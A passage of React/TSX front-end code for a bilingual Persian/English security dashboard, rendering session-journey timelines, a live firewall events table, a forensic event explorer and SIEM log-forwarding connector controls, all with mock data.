                ? "بررسی و ردیابی زنجیره کارهای انجام شده‌ی نشست‌ها برای تشخیص تلاش‌های نفوذ به بخش‌های مهم سیستم" 
                : "Auditing complete sequences of actions taken inside active browser sessions to trace lateral movement patterns."}
            </p>
          </div>
        </div>

        {journeySuccessMsg && (
          <div className="p-3 bg-indigo-500/10 border border-indigo-500/20 text-indigo-400 rounded-lg text-xs font-medium flex items-center gap-2">
            <Check className="w-4 h-4" />
            {journeySuccessMsg}
          </div>
        )}

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          {/* User selection left panel */}
          <div className="lg:col-span-4 space-y-3">
            <h3 className="text-xs font-bold text-slate-500 uppercase tracking-widest mb-1">{isRtl ? "نشست‌های ثبت شده فعال" : "Select Client Session Track"}</h3>
            
            {userJourneysList.map((userTrack) => (
              <div
                key={userTrack.id}
                onClick={() => setSelectedJourneyUser(userTrack.id)}
                className={cn(
                  "p-4 rounded-xl border cursor-pointer transition-all flex items-center justify-between gap-3 text-right ltr:text-left",
                  selectedJourneyUser === userTrack.id
                    ? "bg-indigo-600/10 border-indigo-500/50"
                    : "bg-dash-panel border-dash-border text-slate-400 hover:border-slate-800"
                )}
              >
                <div className="flex items-center gap-2.5">
                  <img src={userTrack.avatar} alt={userTrack.user} className="w-7 h-7 rounded-full border border-slate-700" referrerPolicy="no-referrer" />
                  <div>
                    <h4 className="text-xs font-bold text-slate-200">{userTrack.user}</h4>
                    <span className="text-[10px] text-slate-500 font-mono">{userTrack.ip}</span>
                  </div>
                </div>

                <div className="text-left ltr:text-right shrink-0">
                  <span className={cn(
                    "px-1.5 py-0.5 rounded text-[9px] font-bold block",
                    userTrack.riskIndex > 80 ? "bg-rose-500/15 text-rose-400" :
                    userTrack.riskIndex > 40 ? "bg-amber-500/15 text-amber-400" : "bg-emerald-500/15 text-emerald-400"
                  )}>
                    LVL: {userTrack.riskIndex}%
                  </span>
                  <span className="text-[9px] text-slate-500 font-mono block mt-1">{userTrack.timeSummary}</span>
                </div>
              </div>
            ))}
          </div>

          {/* Timeline visualization on right */}
          <div className="lg:col-span-8">
            <div className="bg-dash-panel border border-dash-border rounded-xl p-5 space-y-4">
              <div className="border-b border-dash-border/40 pb-3 flex justify-between items-center mb-4">
                <div>
                  <h3 className="text-sm font-bold text-slate-205 flex items-center gap-1.5">
                    <Route className="w-4 h-4 text-indigo-400" />
                    <span>{isRtl ? `تاریخچه مسیرهای طی شده: ${activeJourney.user}` : `In-Tunnel Action sequence: ${activeJourney.user}`}</span>
                  </h3>
                  <span className="text-[10px] text-slate-500 font-mono">{activeJourney.role}</span>
                </div>
                <span className="text-[11px] font-mono text-slate-400">{activeJourney.ip}</span>
              </div>

              {/* Vertical steps list */}
              <div className="relative border-l border-slate-800 ml-4 pl-6 space-y-6 text-left ltr:text-left rtl:text-right rtl:border-l-0 rtl:border-r rtl:mr-4 rtl:pr-6 rtl:ml-0">
                {activeJourney.steps.map((st, idx) => {
                  const nodeTitle = isRtl ? st.actionFa : st.action;
                  const nodeDesc = isRtl ? st.descFa : st.desc;
                  const isLast = idx === activeJourney.steps.length - 1;

                  return (
                    <div key={idx} className="relative">
                      {/* Bullet icon placement */}
                      <span className={cn(
                        "absolute -left-[31px] rtl:-right-[31px] rtl:left-auto top-1 w-3 h-3 rounded-full border-2",
                        st.type === "SEVERE"
                          ? "bg-rose-600 border-rose-950 animate-ping animate-duration-1000"
                          : st.type === "WARN"
                            ? "bg-amber-500 border-amber-950"
                            : "bg-emerald-500 border-emerald-950"
                      )} />
                      
                      <div className="space-y-1">
                        <div className="flex flex-col sm:flex-row justify-between sm:items-center gap-2">
                          <h4 className={cn(
                            "text-xs font-bold font-sans",
                            st.type === "SEVERE" ? "text-rose-400" : st.type === "WARN" ? "text-amber-400" : "text-emerald-400"
                          )}>
                            {nodeTitle}
                          </h4>
                          <span className="text-[10px] font-mono text-slate-500 flex items-center gap-1.5 self-start">
                            <Clock className="w-3 h-3" />
                            {st.time}
                          </span>
                        </div>

                        <p className="text-xs text-slate-400 leading-relaxed max-w-2xl">{nodeDesc}</p>
                        
                        <div className="flex items-center justify-between gap-3 pt-2">
                          <span className="text-[10px] font-mono bg-slate-950 border border-slate-900 px-1.5 py-0.5 rounded text-slate-400">
                            STATE: {isRtl ? st.statusFa : st.status}
                          </span>

                          <button
                            onClick={() => handleReverifyStepMfa(st.action)}
                            className="px-2 py-0.5 rounded bg-indigo-600/10 hover:bg-indigo-600/25 text-indigo-400 text-[10px] font-bold border border-indigo-500/20 cursor-pointer"
                          >
                            {isRtl ? "درخواستی چالش هویت" : "STEP-UP MFA"}
                          </button>
                        </div>
                      </div>
                    </div>
                  );
                })}
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // 5) SUBVIEW: DATA & EVENTS TABS INDIVIDUAL IMPLEMENTITIONS
  if (activeTab === "liveEvents") {
    const filteredEvents = liveEvents.filter((item) => {
      if (liveEventFilter === "critical") return item.rScore >= 80;
      if (liveEventFilter === "warning") return item.rScore >= 50 && item.rScore < 80;
      return true;
    });

    return (
      <div className="p-4 md:p-6 space-y-6 text-right ltr:text-left" dir={isRtl ? "rtl" : "ltr"}>
        <div className="flex flex-col sm:flex-row justify-between sm:items-center border-b border-dash-border/40 pb-4 gap-4">
          <div>
            <h2 className="text-xl font-bold text-white flex items-center gap-2">
              <Radio className="w-5 h-5 text-rose-500 animate-pulse animate-duration-1000" />
              {isRtl ? "پایش زنده رویدادهای فایروال" : "Live Security Events Monitor"}
            </h2>
            <p className="text-xs text-slate-500 mt-1">
              {isRtl 
                ? "جریان داده‌ی بلادرنگ رویدادهای فایروال و ورود کاربران که از سرور ارسال می‌شود" 
                : "Real-time security events captured instantly from active network gateways."}
            </p>
          </div>
          <div className="flex flex-wrap items-center gap-2">
            <button
              onClick={() => setIsStreamPaused(!isStreamPaused)}
              className={cn(
                "px-3 py-1.5 rounded-lg text-xs font-bold border flex items-center gap-1.5 transition-colors cursor-pointer",
                isStreamPaused 
                  ? "bg-amber-500/10 border-amber-500/30 text-amber-400 hover:bg-amber-500/20" 
                  : "bg-emerald-500/10 border-emerald-500/30 text-emerald-400 hover:bg-emerald-500/20"
              )}
            >
              <span className={cn("w-2 h-2 rounded-full", isStreamPaused ? "bg-amber-400 animate-pulse" : "bg-emerald-400 animate-pulse")} />
              {isStreamPaused ? (isRtl ? "رزومه ترافیک" : "Resume Stream") : (isRtl ? "توقف ترافیک" : "Pause Stream")}
            </button>
            <button
              onClick={() => setLiveEvents([])}
              className="px-3 py-1.5 rounded-lg text-xs font-bold bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 hover:text-white cursor-pointer"
            >
              {isRtl ? "پاکسازی" : "Clear Feed"}
            </button>
            <button
              onClick={() => {
                const testEvent = {
                  id: "test-" + Math.random().toString(),
                  ip: "10" + "." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255),
                  flag: "🏳️‍🌈",
                  clocEn: "Simulated Agent Target",
                  clocFa: "میزبان تست سناریو",
                  rScore: Math.floor(40 + Math.random() * 59),
                  timestamp: new Date().toISOString(),
                  c: Math.random() > 0.5 ? "rose" : "amber",
                  typeEn: "Simulated Custom Security Signal",
                  typeFa: "سیگنال شبیه‌سازی کرده کاربر"
                };
                setLiveEvents(prev => [testEvent, ...prev]);
              }}
              className="px-3 py-1.5 rounded-lg text-xs font-bold bg-indigo-600 hover:bg-indigo-500 text-white flex items-center gap-1 cursor-pointer"
            >
              <Zap className="w-3.5 h-3.5" />
              {isRtl ? "تولید رویداد تست" : "Simulate Event"}
            </button>
          </div>
        </div>

        {/* Severity Tabs */}
        <div className="flex gap-2 border-b border-dash-border/20 pb-3">
          {[
            { id: "all", label: isRtl ? "همه تهدیدها" : "All Events" },
            { id: "critical", label: isRtl ? "ریسک بحرانی (۸۰+)" : "Critical Risks (80+)" },
            { id: "warning", label: isRtl ? "ریسک متوسط (۵۰-۸۰)" : "Moderate Risks (50-80)" },
          ].map((tab) => (
            <button
              key={tab.id}
              onClick={() => setLiveEventFilter(tab.id)}
              className={cn(
                "px-3 py-1 text-xs rounded-full font-medium transition-colors cursor-pointer",
                liveEventFilter === tab.id
                  ? "bg-indigo-600 text-white"
                  : "bg-slate-800/60 text-slate-400 hover:text-slate-200"
              )}
            >
              {tab.label}
            </button>
          ))}
        </div>

        {/* Event List */}
        <div className="grid grid-cols-1 gap-6">
          <div className="space-y-3">
            <div className="bg-dash-panel border border-dash-border rounded-xl overflow-hidden p-4">
              <div className="overflow-x-auto">
                <table className="w-full text-left ltr:text-left rtl:text-right text-xs">
                  <thead>
                    <tr className="text-slate-500 font-bold border-b border-dash-border/40 pb-2">
                      <th className="pb-3 pr-2">{isRtl ? "آدرس آی‌پی" : "IP Address"}</th>
                      <th className="pb-3 pr-2">{isRtl ? "جغرافیا / مبدا" : "Origin Details"}</th>
                      <th className="pb-3 pr-2">{isRtl ? "شدت خط مشی" : "Risk Severity State"}</th>
                      <th className="pb-3 pr-2">{isRtl ? "طبقه‌بندی" : "Threat Category"}</th>
                      <th className="pb-3 pr-2">{isRtl ? "زمان وقوع" : "Time"}</th>
                      <th className="pb-3 text-center">{isRtl ? "جزئیات" : "Payload JSON"}</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-dash-border/30 text-slate-300">
                    {filteredEvents.map((evt) => {
                      const locationName = isRtl ? evt.clocFa : evt.clocEn;
                      const categoryName = isRtl ? evt.typeFa : evt.typeEn;
                      const elapsedStr = getRelativeTime(evt.timestamp);
                      return (
                        <tr key={evt.id} className="hover:bg-slate-800/10">
                          <td className="py-3 font-mono font-bold text-slate-200">
                            {evt.ip}
                          </td>
                          <td className="py-3 flex items-center gap-1.5">
                            <span className="text-base">{evt.flag}</span>
                            <span className="truncate max-w-[150px]">{locationName}</span>
                          </td>
                          <td className="py-3">
                            <span
                              className={cn(
                                "px-2 py-0.5 rounded text-[10px] font-bold border",
                                evt.c === "rose"
                                  ? "bg-rose-500/10 text-rose-400 border-rose-500/20"
                                  : evt.c === "amber"
                                    ? "bg-amber-500/10 text-amber-400 border-amber-500/20"
                                    : "bg-emerald-500/10 text-emerald-400 border-emerald-500/20"
                              )}
                            >
                              SCORE: {evt.rScore}/100
                            </span>
                          </td>
                          <td className="py-3">
                            <span className={cn(
                              "font-medium",
                              evt.c === "rose" ? "text-rose-400" : evt.c === "amber" ? "text-amber-400" : "text-emerald-400"
                            )}>
                              {categoryName}
                            </span>
                          </td>
                          <td className="py-3 font-mono text-[11px] text-slate-500">
                            {elapsedStr}
                          </td>
                          <td className="py-3 text-center">
                            <button
                              onClick={() => setSelectedExplorerEvent(selectedExplorerEvent?.id === evt.id ? null : evt)}
                              className="px-2 py-0.5 rounded bg-indigo-600/10 hover:bg-indigo-600/25 text-indigo-400 text-[10px] font-bold border border-indigo-500/20 font-mono cursor-pointer"
                            >
                              VIEW
                            </button>
                          </td>
                        </tr>
                      );
                    })}
                    {filteredEvents.length === 0 && (
                      <tr>
                        <td colSpan={6} className="py-8 text-center text-slate-500">
                          {isRtl ? "هیچ رویداد فعالی با فیلتر کنونی وجود ندارد" : "No live events matching selected level."}
                        </td>
                      </tr>
                    )}
                  </tbody>
                </table>
              </div>
            </div>

            {selectedExplorerEvent && (
              <div className="bg-slate-950 border border-dash-border rounded-xl p-5 font-mono text-[11px] text-indigo-300 space-y-2 relative transition-all">
                <button 
                  onClick={() => setSelectedExplorerEvent(null)}
                  className="absolute right-4 top-4 hover:text-white font-sans font-bold text-slate-500 cursor-pointer"
                >
                  ✕
                </button>
                <h4 className="text-xs font-bold text-slate-400 font-sans border-b border-slate-800 pb-2 mb-2">
                  {isRtl ? "شناسنامه ترافیک ورودی لایو:" : "Live Connection Payload Metadata for:"} {selectedExplorerEvent.ip}
                </h4>
                <pre className="overflow-x-auto text-left custom-scrollbar leading-relaxed">
                  {JSON.stringify({
                    timestamp: selectedExplorerEvent.timestamp,
                    session_id: "stream-sess-" + selectedExplorerEvent.id,
                    ingress_node: "proxy-lon-04",
                    handshake_protocol: "TLSv1.3",
                    cipher_suite: "TLS_AES_256_GCM_SHA384",
                    geolocation: {
                      country: selectedExplorerEvent.clocEn,
                      continent: "EU"
                    },
                    client_telemetry: {
                      canvas_hash: "8a1e2f3d",
                      fingerprint_trust_delta: selectedExplorerEvent.rScore > 70 ? "Unreliable" : "HighConfidence"
                    },
                    action_applied: selectedExplorerEvent.rScore > 70 ? "DROP_PACKET" : "CONTINUE_DECRYPT"
                  }, null, 2)}
                </pre>
              </div>
            )}
          </div>
        </div>
      </div>
    );
  }

  if (activeTab === "eventExplorer") {
    const filteredHistoric = historicEvents.filter((item) => {
      const matchSearch = 
        item.ip.toLowerCase().includes(explorerSearch.toLowerCase()) ||
        item.clocEn.toLowerCase().includes(explorerSearch.toLowerCase()) ||
        item.clocFa.toLowerCase().includes(explorerSearch.toLowerCase());
      
      const matchCat = 
        explorerCategory === "all" ||
        (explorerCategory === "vpn" && (item.typeEn.toLowerCase().includes("vpn") || item.clocEn.toLowerCase().includes("vpn"))) ||
        (explorerCategory === "tor" && item.typeEn.toLowerCase().includes("tor")) ||
        (explorerCategory === "botnet" && item.typeEn.toLowerCase().includes("botnet")) ||
        (explorerCategory === "low" && item.rScore < 50);

      return matchSearch && matchCat;
    });

    return (
      <div className="p-4 md:p-6 space-y-6 text-right ltr:text-left" dir={isRtl ? "rtl" : "ltr"}>
        <div className="border-b border-dash-border/40 pb-4">
          <h2 className="text-xl font-bold text-white flex items-center gap-2">
            <List className="w-5 h-5 text-indigo-400" />
            {isRtl ? "کاوشگر تخصصی و آرشیو رویدادها" : "Event Forensic Explorer"}
          </h2>
          <p className="text-xs text-slate-500 mt-1">
            {isRtl 
              ? "جستجو و فیلتر پیشرفته بر روی تاریخچه حوادث امنیتی، نودهای فایروال و بات‌ها" 
              : "Investigate and examine historic security logs, firewall responses, and rogue hosts."}
          </p>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          {/* Controls Panel */}
          <div className="lg:col-span-4 space-y-4">
            <div className="bg-dash-panel border border-dash-border rounded-xl p-5 space-y-4">
              <h3 className="text-xs font-bold text-slate-400 uppercase tracking-widest border-b border-slate-800 pb-2">
                {isRtl ? "ابزارهای جستجو و فیلتر" : "Forensics Query filters"}
              </h3>
              
              <div className="space-y-1.5">
                <label className="text-[11px] text-slate-500 font-bold uppercase">{isRtl ? "جستجوی آی‌پی یا کشور" : "Search IP or Country"}</label>
                <div className="relative">
                  <Search className="absolute top-2.5 left-3 w-4 h-4 text-slate-500 ltr:left-3 rtl:right-3" />
                  <input
                    type="text"
                    value={explorerSearch}
                    onChange={(e) => setExplorerSearch(e.target.value)}
                    placeholder={isRtl ? "مثال: 185.220, ایالات متحده..." : "Query IP, region..."}
                    className="w-full bg-slate-950 border border-slate-800 rounded-lg py-2 pl-9 pr-3 text-xs text-slate-200 focus:outline-none focus:border-indigo-500 rtl:pr-9 rtl:pl-3"
                  />
                </div>
              </div>

              <div className="space-y-1.5">
                <label className="text-[11px] text-slate-500 font-bold uppercase">{isRtl ? "نوع تهدید" : "Threat Category"}</label>
                <select
                  value={explorerCategory}
                  onChange={(e) => setExplorerCategory(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-lg py-2 px-3 text-xs text-slate-200 focus:outline-none focus:border-indigo-500"
                >
                  <option value="all">{isRtl ? "همه تهدیدها" : "All Categories"}</option>
                  <option value="vpn">{isRtl ? "پروکسی ناشناس و VPN" : "VPN / Anonymizers"}</option>
                  <option value="tor">{isRtl ? "ورودی‌های شبکه تور Tor Exit" : "Tor Exit Nodes"}</option>
                  <option value="botnet">{isRtl ? "بات‌نت‌ها و اسکنرهای Mirai" : "Botnets & Scanners"}</option>
                  <option value="low">{isRtl ? "آی‌پی‌های ایمن / کم خطر" : "Clean / Low Risk"}</option>
                </select>
              </div>

              <div className="pt-2">
                <div className="p-3 bg-slate-950/60 rounded-lg border border-indigo-900/10 text-xs text-slate-400 space-y-1.5">
                  <div className="text-white font-semibold flex items-center gap-1">
                    <span>💡</span>
                    <span>{isRtl ? "نکته امنیتی" : "Security Tip"}</span>
                  </div>
                  <p className="text-[10px] leading-relaxed">
                    {isRtl 
                      ? "نودهای تور و پروکسی‌های تجاری عموماً بیشترین نمره منفی ریسک را به دلیل مخفی کردن هویت کلاینت دریافت می‌کنند."
                      : "Tor exit servers and commercial VPN routing blocks carry the highest risk penalty due to identity obfuscation."}
                  </p>
                </div>
              </div>
            </div>
          </div>

          {/* Results spreadsheet */}
          <div className="lg:col-span-8 space-y-4">
            <div className="bg-dash-panel border border-dash-border rounded-xl p-5">
              <div className="flex justify-between items-center mb-4 border-b border-dash-border/40 pb-3">
                <h3 className="text-sm font-semibold text-slate-200">
                  {isRtl ? "مجموعه رکوردهای یافت شده در بایگانی" : "Retrieved Cyber Logs Database"}
                </h3>
                <span className="font-mono text-xs bg-indigo-950 text-indigo-400 border border-indigo-500/20 px-2 py-0.5 rounded">
                  {filteredHistoric.length} {isRtl ? "رکورد خلاصه" : "results match"}
                </span>
              </div>

              <div className="overflow-x-auto">
                <table className="w-full text-left ltr:text-left rtl:text-right text-xs">
                  <thead>
                    <tr className="text-slate-500 font-bold border-b border-dash-border/40 pb-2">
                      <th className="pb-2.5">{isRtl ? "آدرس آی‌پی" : "IP Address"}</th>
                      <th className="pb-2.5">{isRtl ? "موقعیت" : "Country"}</th>
                      <th className="pb-2.5">{isRtl ? "نمره ریسک" : "Score"}</th>
                      <th className="pb-2.5">{isRtl ? "اقدام موثر" : "Mitigation action"}</th>
                      <th className="pb-2.5">{isRtl ? "میزبان معکوس" : "Reverse Host"}</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-dash-border/30 text-slate-300">
                    {filteredHistoric.map((row) => (
                      <tr 
                        key={row.id} 
                        onClick={() => setSelectedExplorerEvent(selectedExplorerEvent?.id === row.id ? null : row)}
                        className={cn(
                          "hover:bg-slate-800/10 cursor-pointer transition-colors",
                          selectedExplorerEvent?.id === row.id ? "bg-indigo-600/5 font-bold" : ""
                        )}
                      >
                        <td className="py-2.5 font-mono text-slate-200">{row.ip}</td>
                        <td className="py-2.5 flex items-center gap-1.5">
                          <span>{row.flag}</span>
                          <span>{isRtl ? row.clocFa : row.clocEn}</span>
                        </td>
                        <td className="py-2.5">
                          <span className={cn(
                            "px-1.5 py-0.5 rounded text-[10px] font-bold font-mono",
                            row.rScore > 80 ? "bg-rose-500/10 text-rose-400" :
                            row.rScore > 55 ? "bg-amber-500/10 text-amber-400" : "bg-emerald-500/10 text-emerald-400"
                          )}>
                            {row.rScore}
                          </span>
                        </td>
                        <td className="py-2.5 text-slate-400 font-semibold">{row.action}</td>
                        <td className="py-2.5 font-mono text-[11px] text-slate-500 truncate max-w-[140px]">{row.host}</td>
                      </tr>
                    ))}
                    {filteredHistoric.length === 0 && (
                      <tr>
                        <td colSpan={5} className="py-8 text-center text-slate-500">
                          {isRtl ? "هیچ لاگی یافت نشد" : "Query yielded no historical incidents."}
                        </td>
                      </tr>
                    )}
                  </tbody>
                </table>
              </div>
            </div>

            {selectedExplorerEvent && (
              <div className="bg-slate-950 border border-dash-border rounded-xl p-5 flex flex-col md:flex-row justify-between gap-6 relative">
                <button
                  onClick={() => setSelectedExplorerEvent(null)}
                  className="absolute right-4 top-4 hover:text-white text-slate-500 text-sm cursor-pointer"
                >
                  ✕
                </button>
                <div className="space-y-3 flex-1">
                  <h4 className="text-sm font-bold text-white flex items-center gap-2">
                    <span className="text-lg">{selectedExplorerEvent.flag}</span>
                    <span>{selectedExplorerEvent.ip}</span>
                  </h4>
                  <div className="grid grid-cols-2 gap-4 text-xs font-mono">
                    <div>
                      <span className="text-slate-500 block">{isRtl ? "دامین معکوس" : "REVERSE DOMAIN"}</span>
                      <span className="text-slate-300 truncate block mt-0.5">{selectedExplorerEvent.host}</span>
                    </div>
                    <div>
                      <span className="text-slate-500 block">{isRtl ? "کد امنیتی رویداد" : "THREAT INTEL RECON"}</span>
                      <span className="text-rose-400 block mt-0.5 font-bold">{isRtl ? selectedExplorerEvent.typeFa : selectedExplorerEvent.typeEn}</span>
                    </div>
                  </div>
                </div>
                <div className="flex flex-col justify-between shrink-0 font-sans text-xs border-t md:border-t-0 md:border-l border-slate-800 pt-4 md:pt-0 md:pl-6 text-right">
                  <div className="mb-2">
                    <span className="text-slate-500 block">{isRtl ? "زمان ثبت حادثه:" : "Incident Logged Time:"}</span>
                    <span className="text-slate-300 font-mono mt-0.5 block">{selectedExplorerEvent.time}</span>
                  </div>
                  <button
                    onClick={() => {
                      alert(`Successfully re-blocked target IP: ${selectedExplorerEvent.ip}`);
                    }}
                    className="px-3 py-1.5 bg-rose-600/20 hover:bg-rose-600/45 border border-rose-500/30 text-rose-400 font-bold rounded-lg uppercase tracking-wide cursor-pointer text-center"
                  >
                    {isRtl ? "انسداد مجدد روتینگ" : "Re-apply BGP drop"}
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    );
  }

  if (activeTab === "dataStreams") {
    const handleToggleConnector = (id: string, name: string) => {
      setStreamConnectors(prev => prev.map(c => c.id === id ? { ...c, enabled: !c.enabled } : c));
      setStreamSuccessMsg(
        isRtl 
          ? `بروکر گزارش‌دهی ${name} با موفقیت به‌روزرسانی شد` 
          : `Reporting forwarding pipeline for ${name} toggled successfully.`
      );
      setTimeout(() => setStreamSuccessMsg(""), 3000);
    };

    const handleFormatChange = (id: string, format: string) => {
      setStreamConnectors(prev => prev.map(c => c.id === id ? { ...c, format } : c));
    };

    const handleSyncStreamsConfig = () => {
      setStreamSuccessMsg(isRtl ? "پیکربندی گیت‌وی کلاستر گزارش‌دهی با موفقیت اعمال شد" : "Gateway streams metadata flushed successfully to all cluster brokers.");
      setTimeout(() => setStreamSuccessMsg(""), 3000);
    };

    return (
      <div className="p-4 md:p-6 space-y-6 text-right ltr:text-left" dir={isRtl ? "rtl" : "ltr"}>
        <div className="flex flex-col sm:flex-row justify-between sm:items-center border-b border-dash-border/40 pb-4 gap-4">
          <div>
            <h2 className="text-xl font-bold text-white flex items-center gap-2">
              <Database className="w-5 h-5 text-teal-400" />
              {isRtl ? "جریان‌های ارسال داده گزارش حسابرسی" : "Audit Logs Forwarding Streams"}
            </h2>
            <p className="text-xs text-slate-500 mt-1">
              {isRtl 
                ? "مدیریت لوله‌ها و پایپ‌لاین‌های خارجی برای انتقال بلادرنگ رویدادهای فایروال به ابزارهایی مثل Splunk و Elasticsearch" 
                : "Synchronize logs stream outputs with external SIEM, log aggregators or analytics endpoints."}
            </p>
          </div>
          <button
            onClick={handleSyncStreamsConfig}
            className="px-4 py-2 bg-teal-600 hover:bg-teal-500 text-white rounded-lg text-xs font-bold font-mono tracking-wider shadow-[0_0_12px_rgba(20,184,166,0.3)] shrink-0 self-start cursor-pointer"
          >
            {isRtl ? "اعمال پیکربندی بر سرورها" : "FLUSH STREAMS POLICY"}
          </button>
        </div>

        {streamSuccessMsg && (
          <div className="p-3 bg-teal-500/10 border border-teal-500/20 text-teal-400 rounded-lg text-xs font-medium flex items-center gap-2">
            <Check className="w-4 h-4" />
            {streamSuccessMsg}
          </div>
        )}

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          {/* Output rate graph widget */}
          <div className="lg:col-span-12">
            <div className="bg-dash-panel border border-dash-border rounded-xl p-5">
              <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-4 gap-3">
                <div>
                  <h3 className="text-slate-200 font-bold text-sm">{isRtl ? "پایش بلادرنگ آهنگ پردازش کانکتورها (Throughput)" : "Outbound Forwarding Telemetry Rate (Dynamic)"}</h3>
                  <span className="text-[11px] text-slate-500 block mt-0.5">{isRtl ? "نرخ ترافیک ارسالی به کلاسترها در ثانیه" : "Average cluster ingestion bandwidth rate: 35.4 KB/s"}</span>
                </div>
                <div className="flex items-center gap-1.5 font-mono text-xs bg-slate-950 px-2 py-1 rounded border border-slate-800">
                  <span className="w-2 h-2 rounded-full bg-teal-400 animate-pulse"></span>
                  <span className="text-slate-400">ACTIVE: 3 CLUSTER GATEWAYS</span>
                </div>
              </div>

              {/* Dynamic Throughput Chart (Recharts Area) */}
              <div className="w-full h-44 mt-4">
                <ResponsiveContainer width="100%" height="100%">
                  <AreaChart data={streamThroughputData} margin={{ top: 10, right: 0, left: -25, bottom: 0 }}>
                    <defs>
                      <linearGradient id="colorTeal" x1="0" y1="0" x2="0" y2="1">
                        <stop offset="5%" stopColor="#14B8A6" stopOpacity={0.4} />
                        <stop offset="95%" stopColor="#14B8A6" stopOpacity={0} />
                      </linearGradient>
                    </defs>
                    <CartesianGrid strokeDasharray="3 3" stroke="#1F2937" vertical={false} />
                    <XAxis dataKey="sec" stroke="#475569" fontSize={10} tickFormatter={(v) => v + "s " + (isRtl ? "قبل" : "ago")} />
                    <YAxis stroke="#475569" fontSize={10} tickLine={false} axisLine={false} tickFormatter={(v) => Math.floor(v) + " KB/s"} />
                    <Tooltip contentStyle={{ backgroundColor: "#090B10", borderColor: "#1F2937", color: "#fff" }} />
                    <Area type="monotone" dataKey="rate" stroke="#14B8A6" strokeWidth={2} fillOpacity={1} fill="url(#colorTeal)" />
                  </AreaChart>
                </ResponsiveContainer>
              </div>
            </div>
          </div>

          {/* Connectors lists Column */}
          <div className="lg:col-span-8 space-y-4">
            <div className="bg-dash-panel border border-dash-border rounded-xl p-5 space-y-4">
              <h3 className="text-slate-200 font-bold text-sm uppercase tracking-wider mb-2 border-b border-slate-800 pb-2">
                {isRtl ? "پایپ‌لاین‌های انتقال به بروکرها" : "SIEM Outbound Pipeline Gateways"}
              </h3>

              <div className="space-y-4">
                {streamConnectors.map((c) => (
                  <div key={c.id} className="flex flex-col md:flex-row justify-between items-start md:items-center p-4 rounded-xl bg-slate-950/40 border border-slate-800/60 hover:border-slate-700 transition-all gap-4">
                    <div className="flex-1 space-y-1">
                      <div className="flex items-center gap-2">
                        <span className={cn("w-2 h-2 rounded-full", c.enabled ? "bg-teal-400 animate-pulse shadow-[0_0_6px_#14B8A6]" : "bg-slate-600")} />
                        <h4 className="text-xs font-bold text-slate-200">{c.name}</h4>
                      </div>
                      <p className="text-[10px] font-mono text-slate-500 truncate max-w-sm">{c.host}</p>
                    </div>

                    <div className="flex flex-wrap items-center gap-3">
                      <div className="flex border border-slate-800 rounded bg-slate-950 overflow-hidden text-[10px] font-mono select-none">
                        {["JSON", "Syslog", "Protobuf"].map((fmt) => (
                          <button
                            key={fmt}
                            disabled={!c.enabled}
                            onClick={() => handleFormatChange(c.id, fmt)}
                            className={cn(
                              "px-2 py-1 border-r border-slate-800 last:border-0 cursor-pointer",
                              c.format === fmt 
                                ? "bg-teal-600 font-bold text-white" 
                                : "text-slate-400 hover:text-white hover:bg-slate-900 disabled:opacity-30 disabled:pointer-events-none"
                            )}
                          >
                            {fmt}
                          </button>
                        ))}
                      </div>

                      <div className="text-right shrink-0 min-w-[70px] font-mono text-[11px] text-teal-400 font-bold">
                        {c.enabled ? c.rate : (isRtl ? "غیرفعال" : "DISABLED")}
                      </div>

                      <button
                        onClick={() => handleToggleConnector(c.id, c.name)}
                        className={cn(
                          "px-3 py-1 rounded text-[10px] uppercase font-bold text-center border font-mono transition-colors cursor-pointer",
                          c.enabled
                            ? "bg-rose-500/10 text-rose-400 hover:bg-rose-600/20 border-rose-500/25"
                            : "bg-teal-500/10 text-teal-400 hover:bg-teal-600/20 border-teal-500/25"
                        )}
                      >
                        {c.enabled ? (isRtl ? "قطع" : "STOP") : (isRtl ? "اتصال" : "START")}
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* stream details info bar */}
          <div className="lg:col-span-4 space-y-4">
            <div className="bg-dash-panel border border-dash-border rounded-xl p-5 space-y-4">
              <h3 className="text-slate-400 font-bold text-xs uppercase tracking-wider">{isRtl ? "تنظیمات عمومی لوله‌های ترافیک" : "Ingest Buffering Policy"}</h3>
              
              <div className="space-y-3 text-xs leading-relaxed text-slate-300 font-sans">
                <div className="space-y-1">
                  <span className="text-[11px] text-slate-500 block uppercase font-mono">{isRtl ? "محدودیت حجم بافرینگ کلس کلاینت" : "Ingress In-Memory Queue size"}</span>
                  <div className="font-mono text-white text-[11px] bg-slate-950 p-2 rounded border border-slate-800">4,096 MB Maximum</div>
                </div>

                <div className="space-y-1">
                  <span className="text-[11px] text-slate-500 block uppercase font-mono">{isRtl ? "زمان تاخیر فلاش ترافیک لایو" : "Streams Flush Interval"}</span>
                  <div className="font-mono text-white text-[11px] bg-slate-950 p-2 rounded border border-slate-800">500 ms (Microbatch enabled)</div>
                </div>

                <div className="space-y-1">
                  <span className="text-[11px] text-slate-500 block uppercase font-mono">TLS Security Layer</span>
                  <div className="font-mono text-white text-[11px] bg-slate-950 p-2 rounded border border-slate-800">Mutual TLS Handshake (mTLS)</div>
                </div>

                <p className="text-[10px] text-slate-500 leading-relaxed pt-2">
                  {isRtl 
                    ? "کلیه گزارش ترافیک ورودی به جهت امنیت اطلاعات با لایه‌ی رمزگذاری متقابل گواهی دو طرفه (mTLS) به سرورهای SIEM سازمان دلیور می‌شوند."
                    : "All log payloads forwards are cryptographically sealed with mTLS standard profile using internal proxy root hashes."}
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  if (activeTab === "auditLogs") {
    // 1) Clear ConsoleLogs
    const handleClearLogs = () => {
      setAuditLogsList([]);
    };

    // 2) Write custom manual audit message
    const handleInjectNoteLog = (e: React.FormEvent) => {
      e.preventDefault();
      if (!customAuditNote.trim()) return;

      const dateStr = new Date().toISOString().replace('T', ' ').substring(0, 19);
      const newLog = {
        id: Math.random().toString(),
        time: dateStr,
